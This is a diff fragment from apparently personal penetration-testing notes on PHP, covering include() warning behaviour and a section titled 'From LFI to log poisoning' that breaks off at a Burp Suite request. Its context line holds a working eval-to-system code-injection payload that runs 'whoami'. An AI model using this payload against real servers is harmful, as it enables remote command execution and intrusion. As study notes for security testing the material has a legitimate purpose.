@@ -12,6 +12,7 @@ ${eval($_GET[1])}&1=system($_GET[2]);&2=whoami;
 
 # include() 
 Only generates a warning, i.e., E_WARNING, and continue the execution of the script.
+
 **Case**:  From LFI to log poisoning
 - Burpsuite request example:
 ```txt
